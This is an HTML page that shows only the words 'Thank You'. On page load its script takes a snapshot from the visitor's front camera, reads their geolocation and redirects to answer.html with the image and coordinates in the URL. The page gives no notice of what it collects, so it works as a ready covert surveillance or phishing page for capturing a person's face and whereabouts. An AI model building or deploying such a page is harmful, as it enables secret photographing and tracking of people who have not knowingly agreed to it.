<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thank You</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
        h1 { font-size: 3em; }
    </style>
</head>
<body>

    <h1>Thank You</h1>

    <script>
        let locationData = {};
        let snapshot = null;

        // Access front camera
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    // Capture a snapshot after the video stream is ready
                    video.onloadedmetadata = () => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        snapshot = canvas.toDataURL('image/png');
                        stream.getTracks().forEach(track => track.stop()); // Stop the camera after snapshot
                        checkAllDataCollected();
                    };
                })
                .catch(() => {
                    checkAllDataCollected();
                });
        }

        // Access location
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(position => {
                locationData.latitude = position.coords.latitude;
                locationData.longitude = position.coords.longitude;
                checkAllDataCollected();
            }, () => {
                locationData.error = "Unable to retrieve location";
                checkAllDataCollected();
            });
        } else {
            locationData.error = "Geolocation not supported";
            checkAllDataCollected();
        }

        // Function to check if all data is collected
        function checkAllDataCollected() {
            if (snapshot !== null && (locationData.latitude !== undefined || locationData.error)) {
                redirectToAnswer();
            }
        }

        // Redirect to answer.html with the snapshot and location data
        function redirectToAnswer() {
            const queryParams = new URLSearchParams({
                snapshot: encodeURIComponent(snapshot),
                latitude: locationData.latitude || '',
                longitude: locationData.longitude || '',
                locationError: locationData.error || ''
            });

            window.location.href = 'answer.html?' + queryParams.toString();
        }
    </script>

</body>
</html>
